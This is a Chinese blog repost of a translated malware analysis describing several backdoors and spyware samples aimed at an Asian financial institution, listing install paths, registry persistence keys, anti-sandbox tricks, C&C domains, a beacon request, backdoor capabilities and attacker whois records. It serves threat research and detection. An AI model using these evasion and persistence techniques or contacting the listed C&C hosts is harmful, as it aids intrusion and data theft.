<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
  <title>转]多种针对某亚洲金融机构的恶意软件分析 | Blog of Secer</title>
  <meta name="description" content="" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="MobileOptimized" content="320" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
  <link rel="stylesheet" type="text/css" href="/css/style.css" />
  <meta name="generator" content="Blog of Secer">

  
  
  

  
</head>

<!--
<body class="post-template">
-->
<body class="home-template">
<div id="perspective" class="perspective effect-movedown">
  <div class="container">
    <!-- wrapper -->
    <div class="wrapper">

      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
    <div class="vertical">
        <div class="site-head-content inner">
             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
            <h1 class="blog-title">Blog of Secer</h1>
            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
        </div>
    </div>
</header>

      

<main class="content" role="main">
  <article class="post">
    <span class="post-meta">
      <time datetime="2015-06-11T22:14:19.000Z" itemprop="datePublished">
          2015-06-12
      </time>
    
</span>
    <h1 class="post-title">转]多种针对某亚洲金融机构的恶意软件分析</h1>
    <section class="post-content">
      <p>source：<a href="http://www.cyphort.com/multiple-malwares-used-to-target-an-asian-financial-institution/" target="_blank" rel="external">http://www.cyphort.com/multiple-malwares-used-to-target-an-asian-financial-institution/</a></p>  <h3>0x00 前言</h3>  <hr align="center" size="0" width="100%" noshade="noshade">  <p>近来, Cyphort Labs已收到多种针对于亚洲某金融机构的恶意软件,由于某进行中的研究,我们将匿名该公司.</p>  <p>来源已经表明,攻击的起始入口为其中一名雇员打开了某收到的鱼叉式钓鱼邮件,攻击涉及到了多种后门和用于窃取信息的木马。一些恶意软件具有反沙盒属性且含有对抗heuristic signatures（一般被反病毒公司使用）的保护.多种恶意软件样本也展示了某种一般性的主题,例如:将自身安装到<code>%ProgramFiles%</code>或<code>%UserProfile%</code>文件夹（取决于用户是否有admin特权）中.此外,多数的恶意软件样本是用<code>Borland Delphi</code>编译的,它们带有已加密的字符串和API字符串（被混淆或被分为多个字符串）作为保护以对抗heuristic signatures技术.除了某个样本外,其它样本都没被加壳。</p>  <p>以文件的创建日期为根据,它的出现早于2015年2月,并已持续了三个多月</p>  <p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001[5]" border="0" alt="clip_image001[5]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0015.png" width="277" height="240"></p>  <p>在该攻击中使用的样本概要</p>  <p>技术分析</p>  <p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image002[4]" border="0" alt="clip_image002[4]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0024.jpg" width="1212" height="1172"></p>  <p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image003[4]" border="0" alt="clip_image003[4]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0034.jpg" width="1240" height="242"></p>  <h3>0x01 技术分析</h3>  <hr align="center" size="0" width="100%" noshade="noshade">  <h4>GoogleUpdate.exe</h4>  <p>今天,流行的恶意软件中，文件的文件结构通常并不像我们看到的那样.为什么？因为在今天,多数AV产品部署了基于启发式的检测技术（检测加壳样本和某些具有非常规文件结构的样本）.该恶意软件没被加壳且区段类似于某正常文件.</p>  <p>被加密的字符串只在被使用前解密.恶意软件通常将其API字符串分为多个字符串.这也为了躲避heuristic signatures（检测字符串和可疑APIs）.</p>  <p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image004[4]" border="0" alt="clip_image004[4]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0044.png" width="341" height="145"></p>  <p>如果用户有admin特权，则它将其自身副本移动到%Pr0gramFiles%文件夹中.如果不是则不移动 如果具有admin特权:</p>  <pre>%ProgramFilesDir%\Windows NT\Accessories\nt\GoogleUpdate.exe</pre><br><br><p>如果不具有admin特权:</p>

<pre>%UserProfile%\Applications\GoogleUpdate.exe</pre>

<p>它作为某种服务（带有”SENSS”服务名）安装自身.</p>

<p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image005[4]" border="0" alt="clip_image005[4]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0054.png" width="654" height="142"></p>

<p>在检查（它是否成功作为某种服务在运行）之后,检查父进程是否为explorer.exe或iexplore.exe.该dll被加密（通过XOR 0x89作为密钥）</p>

<p><em><b>反沙盒</b></em></p>

<p>检测Sleep加速功能</p>

<p>为了挫败沙盒,该恶意软件凭借sleeps或loops拖延恶意软件的执行,因为他知道某沙盒系统将会在限制的短时间内执行恶意软件.</p>

<p>通过对比,一旦位于你的系统内，恶意软件将有大量时间来实现它的恶意意图。为了挫败该保护，沙盒系统部署了加速功能， 即如果他们检测到某样本使用某种延迟技术，它将加速该样本的执行.例如，如果它检测到该样本sleeps一分钟那么该系统将其改为sleeps 1秒。不幸的是, 对该恶意软件来说，这种技术已经不起作用了.该恶意软件可通过发布某个sleep以检测到sleep的加速，之后在得到消逝时间的同时检查消逝的时间是否比sleep的时间短</p>

<p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image006[4]" border="0" alt="clip_image006[4]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0064.png" width="581" height="256"></p><br><a id="more"></a><br><p></p>

<p>检测API钩子</p>

<p>沙盒系统也会钩住APIs以监控某文件操作.该恶意软件通过检查某API的第一条指令是否为jmp,call或一push-retn来检测钩子.它检查某API地址的起始字节是否为如下字节：</p>

<p>· E8</p>

<p>· E9</p>

<p>· EB</p>

<p>· FF</p>

<p>· 68????????C3 (push retn)</p>

<p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image007[4]" border="0" alt="clip_image007[4]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0074.png" width="399" height="488"></p>

<p><em><b>Payload</b></em></p>

<p>被注入的代码是某后门,它被用于与如下C&amp;C服务器通信：</p>

<pre>bbs.gokickes.com:80</pre>

<pre>img.lifesolves.com:8080</pre>

<pre>domain.gokickes.com:443</pre>

<p>取决于后门中的命令，该恶意软件有如下功能：</p>

<pre>下载并执行额外的文件</pre>

<p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image008[4]" border="0" alt="clip_image008[4]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0084.png" width="491" height="198"></p>

<pre>捕获屏幕截图</pre>

<pre>捕获鼠标和键盘事件记录</pre>

<p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image009[4]" border="0" alt="clip_image009[4]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0094.png" width="321" height="369"></p>

<pre>更新自身</pre>

<pre>打开远程shell</pre>

<pre>终止进程</pre>

<pre>枚举网络共享</pre>

<pre>枚举驱动器</pre>

<pre>卸载自身</pre>

<pre>最后所有被发送和服务器中接收的数据用0xd5进行异或操作实现加密</pre>

<p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image010[4]" border="0" alt="clip_image010[4]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0104.png" width="520" height="322"></p>

<h4>mslives.exe</h4>

<p>该样本与GoogleUpdate.exe有类似的文件结构.但是它没有部署类似的反沙盒功能.</p>

<p>运行第一次时，在进行它的安装计划前将sleeps300秒。之后，如下所示它创建某自身副本</p>

<pre>%ProgramFiles%\Windows NT\Accessories\Microsoft\mslives.exe</pre>

<p>然而，该副本的文件末尾写入了大量垃圾数据，它的大小比自身大小大了100MB。它将对该文件进行1000次的写入100KB操作.为避开沙盒这里做了两件事.首先,该恶意软件不创建自身副本（让该恶意软件的行为不寻常并出现 使该恶意软件行为不寻常并可能因有利操作而出现于沙盒.通常恶意软件操作是为了创建某确切的自身副本。其次,多次写操作事件可能超过沙盒的限制.释放的文件副本的大小让沙盒可信任</p>

<p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image011[4]" border="0" alt="clip_image011[4]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0114.png" width="572" height="304"></p>

<p>它用CreateProcess执行它的副本接着检查是否作为Iexplore.exe运行，如果不是,它将创建一个被挂起的iexplore.exe进程并将它的代码通过覆盖iexplore.exe的主模块的方式注入其中, 它创建隐藏的windows窗口名和类名“111111”, 然后创建一自启动注册表入口如下（让其在每次机器启动时自动启动）</p>

<pre>HKLM\Software\Microsoft\Windows\CurrentVersion\Run </pre>

<pre>&#160; Valuue: msliveupdate</pre>

<pre>&#160; Data: %ProgramFilesDir%\Windows NT\Accessories\Microsoft\mslives.exe</pre>

<p><em><b>Payload</b></em></p>

<p>该样本只有一个目的，该目的是下载并执行从 <code>forum.energymice.com.</code>中下载的文件</p>

<pre>GET /view/login.asp HTTP/1.1</pre>

<pre>Content-Type: */*</pre>

<pre>User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32; 5.1)</pre>

<pre>Host: forum.energymice.com</pre>

<pre>Cache-Control: no-cache</pre>

<p>将下载的文件放入<code>%TEMP%</code>文件夹中并执行它.不幸的是，在我们分析的同时，用于下载的URL没返回任何程序</p>

<p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image012[4]" border="0" alt="clip_image012[4]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0124.png" width="543" height="304"></p>

<h4>winhost.exe</h4>

<hr align="center" size="0" width="100%" noshade="noshade">

<p>不想其它文件,该文件明显被加壳了.PEID识别壳如下:</p>

<pre>ASProtect 1.2x – 1.3x [Registered] -&gt; Alexey Solodovnikov</pre>

<p>该文件是一个命名为”HDOOR”的后门因为我们在其自身发现的该字符串。我们也发现其它有趣的字符串(指明被使用的保护程序)</p>

<pre>HDoor, Version 1.0</pre>

<pre>Copyright (C) 2013</pre>

<pre>(c) 2010 DYAMAR EnGineerinG, All rights reserved, http://www.dyamar.com.</pre>

<p>该后门监听143端口并等待客户端连接和发布命令<code>.143</code>端口是默认的<code>IMAP non-encrypted</code>端口IMAP或（因特网信息通道协议）是邮箱协议的一种（被使用于某本地客户端上访问位于远程web服务器的电子邮箱.</p>

<p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image013[4]" border="0" alt="clip_image013[4]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0134.png" width="546" height="71"></p>

<p>它检查用户是否有admin特权.如果用户有admin特权,它将作为某服务安装自身并将其副本存放在如下目录:</p>

<pre>%ProgramFiles%\Common Files\System\NT\lib\winhost.exe</pre>

<p>如果用户没有admin特权,将如下安装自身并在注册表中构造一个自启动键入口</p>

<pre>%USERPROFILE%\System\winhost.exe</pre>

<p>自启动注册表如下:</p>

<pre>HKLM\Software\Microsoft\Windows\CurrentVersion\Run </pre>

<pre>&#160; Value: Microsoft Messenger</pre>

<pre>&#160; Data: %USERPROFILE%\System\winhost.exe</pre>

<p><em><b>Payload</b></em></p>

<p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image014[4]" border="0" alt="clip_image014[4]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0144.png" width="617" height="276"></p>

<p>它有能力执行如下操作（取决于攻击者的命令）。</p>

<p>· 断开连接</p>

<p>· 得到后门的安装路径</p>

<p>· 列出文件或目录</p>

<p>· 输入某txt文件的内容</p>

<p>· 执行某程序</p>

<p>· 下载某文件</p>

<p>· 得到某CMDShell</p>

<p>· 退出某CMDShell</p>

<p>· 上传某文件</p>

<p>· 下载某个文件</p>

<p>· 加载 dll 库</p>

<p>· 释放 dll 库</p>

<h4>nethost.exe</h4>

<hr align="center" size="0" width="100%" noshade="noshade">

<p>安装它自身副本位置取决于用户是否有admin特权：</p>

<p>如果用户有admin特权：</p>

<pre>%ProgramFiles% \common files\system\library\nethost.exe</pre>

<p>作为某种服务安装自身:</p>

<pre>HKLM\System\CurrentControlSet\Services\ncoglsse </pre>

<pre>DisplayName = Microsoft Wireless Device Service</pre>

<pre>ImagePath = %ProgramFiles% \common files\system\library\nethost.exe</pre>

<p>如果没有admin特权:</p>

<pre>%USERPROFILE% \system\library\nethost.exe</pre>

<p>构造如下自启动键</p>

<pre>HKCU\Software\Microsoft\Windows\CurrentVersion\Run </pre>

<pre>Value: “ncoglsse”</pre>

<pre>Data: %ProgramFiles%\common files\system\library\nethost.exe</pre>

<p>在安装之后，它将被注入到lsass.exe以驻存于内存并执行它的payload.</p>

<pre>Payload</pre>

<p>从如下URLs中下载</p>

<pre>http://hud321.astringer.com/images/log.gif</pre>

<pre>http://grop.waterglue.org/images/logg.gif</pre>

<pre>http://hud.astringer.com/images/log.gif</pre>

<p>被下载的文件内容是被加密的URLs（用它以连接到其C&amp;C）.恶意软件用HTTP POST连接到该URL并发送如下信息。</p>

<p>· IP 地址</p>

<p>· Language ID</p>

<p>· 恶意软件的版本</p>

<p>· 操作系统的版本</p>

<p>· 机器名</p>

<p>它从C&amp;C中接收命令且有能力做到如下:</p>

<pre>在你PC上收集关于驱动器和文件夹的信息</pre>

<pre>列出文件</pre>

<p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image015[4]" border="0" alt="clip_image015[4]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0154.png" width="334" height="304"></p>

<pre>下载文件</pre>

<pre>终止文件</pre>

<pre>打开 CMD shell</pre>

<p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image016[4]" border="0" alt="clip_image016[4]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0164.png" width="542" height="304"></p>

<h4>Shell64.dll&#160; </h4>

<p>Shell64_u.dll-加载器组件 加载器组建被当作某种服务运行,加载组件并确保完全感染.服务，包括服务名（通过恶意软件释放程序来配置,它在编写时是不可知的.字符串被嵌入于加载器组件（促成程序用Dyamar保护程序加壳）,但二进制程序没有留下彻底被保护的痕迹.</p>

<p>通过宏和大量的混淆字符串促成简明的混淆元素,表明该行为试图让分析变得更复杂但它可轻易被绕过.同时程序也由三部分假输出构成,展示了更多的混淆元素.有趣的是,程序保留一个日志文件,定位于C：\debug.txt，该位置被写入调试信息.</p>

<p>ServiceMan将直接执行某导出表,或是低于Windows操作系统6.0版本的<code>loadFunc</code>或是6.0及以上版本的<code>win7load</code>.表明导出表加载间谍组件，通过某个弹出的rundll32.exe进程（带有有根据的参数集）.第二个二进制程序导出两个函数,’main‘和’lowmain‘,它再次兼容6.0上下的操作系统版本.</p>

<p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image017[4]" border="0" alt="clip_image017[4]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0174.png" width="194" height="153"></p>

<h4>Shell64.dll –间谍组件</h4>

<hr align="center" size="0" width="100%" noshade="noshade">

<p>该组件由内部名为’Server.dll’模块构成.它导出‘main’ 和‘lowmain函数,main函数服务于6.0及以上的操作系统版本,lowmain服务于6.0以下的操作系统版本.仅像加载器组件那样,该二进制程序创建并持有<code>C:\debug.txt</code>文件(写入被调试的信息)</p>

<p>在启动shell64.dll期间创建某命名为mutext的文件,称号为<code>Global\KongQi[TickCount]</code>，TickCount的位置实时记录感染次数。同时恶意软件创建某个命名为view的进程，他被使用于在线程和介入的进程间交换运行时信息,称号为’_kaspersky’.选择该称号毫无疑问是为了提高窃取的隐蔽性</p>

<p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image018[4]" border="0" alt="clip_image018[4]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0184.png" width="361" height="216"></p>

<p>在启动恶意软件期间,它获取关于被感染系统的信息并将其发到它的远程服务器。信息包括:</p>

<pre>主机名</pre>

<pre>系统cpu电源</pre>

<pre>操作系统版本</pre>

<pre>Drive geometry for PHYSICALDRIVE0</pre>

<pre>全局内存状态</pre>

<pre>视频捕获驱动的描述信息</pre>

<pre>进程列表中正运行的安全产品</pre>

<pre>枚举安全产品</pre>

<p>如下列表所示为： 搜索到的安全产品</p>

<p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image019[4]" border="0" alt="clip_image019[4]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0194.jpg" width="616" height="1214"></p>

<p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image020[4]" border="0" alt="clip_image020[4]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0204.jpg" width="586" height="1224"></p>

<p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image021[4]" border="0" alt="clip_image021[4]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0214.jpg" width="612" height="456"></p>

<p>如下为被枚举到的防火墙安装情况</p>

<pre>Norton Personal Firewall&#160;&#160;&#160;&#160;&#160;&#160;&#160; </pre>

<pre>ZoneAlarm&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </pre>

<pre>Comodo Firewall&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </pre>

<pre>eTrust EZ Firewall&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </pre>

<pre>F-Secure Internet Security&#160;&#160;&#160;&#160;&#160; </pre>

<pre>McAfee Personal Firewall&#160;&#160;&#160;&#160;&#160;&#160;&#160; </pre>

<pre>Outpost Personal Firewall&#160;&#160;&#160;&#160;&#160;&#160; </pre>

<pre>Panda Internet Seciruty Suite&#160;&#160; </pre>

<pre>Panda Anti-Virus/Firewall&#160;&#160;&#160;&#160;&#160;&#160; </pre>

<pre>BitDefnder/Bull Guard Antivirus</pre>

<pre>Rising Firewall&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </pre>

<pre>360Safe AntiArp</pre>

<h4>间谍功能</h4>

<hr align="center" size="0" width="100%" noshade="noshade">

<p>一旦恶意软件完成部署,则等待接收来自远程服务器的指令.它的功能相当多,且被设计来在被感染系统中窃取数据.用<code>deflare</code>算法压缩被窃取的信息并将其发送到某远程服务器.如下为分析出的函数列表:</p>

<p>· Video Captures使用某命名为CVideoCap的捕获窗口,压缩视频时使用Windows VCM API(视频压缩管理器)</p>

<p>· 从系统的声音输入设备中捕获信息,如麦克风</p>

<p>· 从当前桌面的粘贴板窃取数据,他可从密码管理器中提取密码</p>

<p>· 捕获截图并压缩它们,作为某数据流潜逃</p>

<p>· 样本含有某用户态键盘记录器,通过SetWindowsHookEx设置全局windows钩子以监听键盘事件,它通过Windows IMM API（Input Method Manager）解析;键击记录被转储到某’jpjl.dat’文件中</p>

<p>· 清理事件日志（’应用‘，’安全‘，’系统‘）,一般是为了擦除某次入侵的取证证据.</p>

<p>· 关闭系统,意外强制重启</p>

<p>· 创建某本地用户名的描述‘This user account is used by the Visual Studio .NET Debugger’</p>

<p>· 下载文件并执行它们</p>

<p>· 执行硬盘中其他的二进制程序</p>

<p>· 在系统上枚举文件和文件属性，修改并删除文件和目录</p>

<p>· 枚举已打开程序的窗口名</p>

<p>· 枚举系统属性如操作系统版本,cpu电源或硬盘的内存容量,系统运行时间,处理器数,机器上运行中的安全产品的进程名,计算机名,当前用户的用户名,已附加的驱动器.</p>

<p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image022[4]" border="0" alt="clip_image022[4]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0224.png" width="635" height="192"></p>

<p>· 枚举dial-up连接参数,例如电话号码和设备名</p>

<p>· 开启终端服务并允许远程连接</p>

<p>· 弹出消息窗口</p>

<p>· 开启某socket来发送并接收数据</p>

<p>删除它的文件并持续机器中的某机制,等等.卸载服务并移除某自启动注册表(位于<code>[HKLM]..\CurrentVersion\Run named ‘MSLiveMessenger’</code> )；这是不易理解的想法,创建该键的方法可从如下链接中了解到: <a href="http://www.cyphort.com/multiple-malwares-used-to-target-an-asian-financial-institution/#sthash.O2q4UOUI.dpuf" target="_blank" rel="external">http://www.cyphort.com/multiple-malwares-used-to-target-an-asian-financial-institution/#sthash.O2q4UOUI.dpuf</a></p>

<p><em><b>持续性手段</b></em></p>

<p>设计二进制程序以在Windows服务的上下文内运行,假定通过某释放程序搭建.服务名也不明确,因为它是由释放程序设置的.然而,恶意软件的功能有: 将其payload注入到远程进程并含有注入到winlogon.exe的函数（在Windows6.0之前的版本中）</p>

<pre>dllhost.exe</pre>

<p>该恶意软件不会做更多事.它仅试图从<code>blog.softfix.co.kr:80</code>下载东西</p>

<p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image023[4]" border="0" alt="clip_image023[4]" src="http://img.cker.in/a7cd34ff4b09_C78D/clip_image0234.png" width="442" height="285"></p>

<h3>0x02 幕后是谁？</h3>

<hr align="center" size="0" width="100%" noshade="noshade">

<p>使用C&amp;C服务器的攻击者在韩国注册的注册记录看起来是伪造的.多数C&amp;C服务器也拥有hugedomains.com,该公司之前售卖拥有的域名和隐藏信息服务.我们也可以意识到字符串位于二进制程序中,它显然不是来自本地的</p>

<p>C&amp;C使用的whois记录如下</p>

<p>bbs.gokickes.com:80, domain.gokickes.com:443 (GoogleUpdate.exe)</p>

<pre>Emails&#160;&#160;&#160;&#160; dodomonk@mail.com</pre>

<pre>/* &lt;![CDATA[ */!function(){try{var t=&quot;currentScript&quot;in document?document.currentScript:function(){for(var t=document.getElementsByTagName(&quot;script&quot;),e=t.length;e--;)if(t[e].getAttribute(&quot;cf-hash&quot;))return t[e]}();if(t&amp;&amp;t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute(&quot;data-cfemail&quot;);if(a){for(e=&quot;&quot;,r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}}}catch(u){}}();/* ]]&gt; */ (a, t, r)</pre>

<pre>Names smith jack (a, t, r)</pre>

<pre>Organizations&#160;&#160;&#160;&#160; </pre>

<pre>Streets seoul, korea (a, t, r)</pre>

<pre>Cities seoul (a, t, r)</pre>

<pre>States seoul (a, t, r)</pre>

<pre>Postals 158070 (a, t, r)</pre>

<pre>Countries KR (a, t, r)</pre>

<pre>Phones 8245896312 (a, t, r)</pre>

<p>img.lifesolves.com:8080 (GoogleUpdate.exe)</p>

<pre>Emails&#160;&#160;&#160;&#160; jimkimteen@mail.com</pre>

<pre>/* &lt;![CDATA[ */!function(){try{var t=&quot;currentScript&quot;in document?document.currentScript:function(){for(var t=document.getElementsByTagName(&quot;script&quot;),e=t.length;e--;)if(t[e].getAttribute(&quot;cf-hash&quot;))return t[e]}();if(t&amp;&amp;t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute(&quot;data-cfemail&quot;);if(a){for(e=&quot;&quot;,r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}}}catch(u){}}();/* ]]&gt; */ (a, t, r)</pre>

<pre>Names zhang yunqiang (a, t, r)</pre>

<pre>Organizations&#160;&#160;&#160;&#160; </pre>

<pre>Streets Taiping Road (a, t, r)</pre>

<pre>Cities seoul (a, t, r)</pre>

<pre>States seoul (a, t, r)</pre>

<pre>Postals 100-744 (a, t, r)</pre>

<pre>Countries KR (a, t, r)</pre>

<pre>Phones 82527656289 (a, t, r)</pre>

<p>softfix.co.kr (dllhost.exe)</p>

<pre>Registrant&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; : gson</pre>

<pre>Administrative Contact(AC)&#160; : zhang yunqiang</pre>

<pre>AC E-Mail&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; : jimkimteen@mail.com</pre>

<pre>/* &lt;![CDATA[ */!function(){try{var t=&quot;currentScript&quot;in document?document.currentScript:function(){for(var t=document.getElementsByTagName(&quot;script&quot;),e=t.length;e--;)if(t[e].getAttribute(&quot;cf-hash&quot;))return t[e]}();if(t&amp;&amp;t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute(&quot;data-cfemail&quot;);if(a){for(e=&quot;&quot;,r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}}}catch(u){}}();/* ]]&gt; */</pre>

<pre>Registered Date&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; : 2014. 01. 08.</pre>

<pre>Last Updated Date&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; : 2014. 01. 08.</pre>

<pre>Expiration Date&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; : 2016. 01. 08.</pre>

<pre>Publishes&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; : N</pre>

<pre>Authorized Agency&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; : Gabia, Inc.(http://www.gabia.co.kr)</pre>

<pre>DNSSEC&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; : unsigned</pre>

<p>diskoco.com (mpsvc.exe)</p>

<pre>Registrant Name:yang qi</pre>

<pre>Registrant Organization:yang qi</pre>

<pre>Registrant Street:Guancheng District No126</pre>

<pre>Registrant City:dong guan</pre>

<pre>Registrant State/Province:Guangdong</pre>

<pre>Registrant Postal Code:523000</pre>

<pre>Registrant Country:China</pre>

<pre>Registrant Phone:+86.0769 89098138</pre>

<pre>Registrant Phone Ext:</pre>

<pre>Registrant Fax:+86.0769 89098200</pre>

<pre>Registrant Fax Ext:</pre>

<pre>Registrant Email:softmoon@mail.com</pre>

<pre>/* &lt;![CDATA[ */!function(){try{var t=&quot;currentScript&quot;in document?document.currentScript:function(){for(var t=document.getElementsByTagName(&quot;script&quot;),e=t.length;e--;)if(t[e].getAttribute(&quot;cf-hash&quot;))return t[e]}();if(t&amp;&amp;t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute(&quot;data-cfemail&quot;);if(a){for(e=&quot;&quot;,r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}}}catch(u){}}();/* ]]&gt; */</pre>

<p>forum.energymice.com (mslives.exe)</p>

<pre>Registrant Name: Domain Admin</pre>

<pre>Registrant Organization: HugeDomains.com</pre>

<pre>Registrant Street: 2635 Walnut Street</pre>

<pre>Registrant City: Denver</pre>

<pre>Registrant State/Province: CO</pre>

<pre>Registrant Postal Code: 80205</pre>

<pre>Registrant Country: US</pre>

<pre>Registrant Phone: +1.303.893.0552</pre>

<pre>Registrant Phone Ext:</pre>

<pre>Registrant Fax:</pre>

<pre>Registrant Fax Ext:</pre>

<pre>Registrant Email: domains@hugedomains.com</pre>

<pre>/* &lt;![CDATA[ */!function(){try{var t=&quot;currentScript&quot;in document?document.currentScript:function(){for(var t=document.getElementsByTagName(&quot;script&quot;),e=t.length;e--;)if(t[e].getAttribute(&quot;cf-hash&quot;))return t[e]}();if(t&amp;&amp;t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute(&quot;data-cfemail&quot;);if(a){for(e=&quot;&quot;,r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}}}catch(u){}}();/* ]]&gt; */</pre>

<p>astringer.com (nethost.exe)</p>

<pre>Registrant Name: Domain Admin / This Domain is For Sale</pre>

<pre>Registrant Organization: HugeDomains.com</pre>

<pre>Registrant Street: 2635 Walnut Street</pre>

<pre>Registrant City: Denver</pre>

<pre>Registrant State/Province: CO</pre>

<pre>Registrant Postal Code: 80205</pre>

<pre>Registrant Country: US</pre>

<pre>Registrant Phone: +1.303.893.0552</pre>

<pre>Registrant Phone Ext:</pre>

<pre>Registrant Fax:</pre>

<pre>Registrant Fax Ext:</pre>

